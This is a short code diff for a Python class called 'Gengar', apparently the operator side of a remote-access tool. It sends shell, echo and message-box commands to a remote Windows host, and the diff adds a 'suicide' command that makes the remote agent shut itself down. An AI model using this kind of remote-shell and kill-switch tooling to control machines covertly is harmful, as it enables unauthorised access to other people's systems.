@@ -1,8 +1,6 @@
 import datetime
 import socket
 import struct
-import time
-import uuid
 from dataclasses import dataclass
 from logging import log
 from typing import final
@@ -14,6 +12,7 @@ class CommandTypes:
     ECHO = 0
     SHELL = 1
     MSGBOX = 2
+    SUICIDE = 3
 
 
 INT_SIZE = 4
@@ -39,6 +38,7 @@ class Gengar:
     host: str
     spawn_time: datetime.datetime
     _authenticated: bool = False
+    alive: bool = True
 
     def init(self):
         self.username = self.shell('echo %username%').output
@@ -68,6 +68,11 @@ class Gengar:
     def msgbox(self, title: str, text: str):
         self._sock.send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
                         title.encode() + struct.pack('I', len(text)) + text.encode())
+
+    def suicide(self):
+        self._sock.send(struct.pack('I', CommandTypes.SUICIDE))
+        self._sock.close()
+        self.alive = False
 
     def auth(self):
         if self._authenticated:
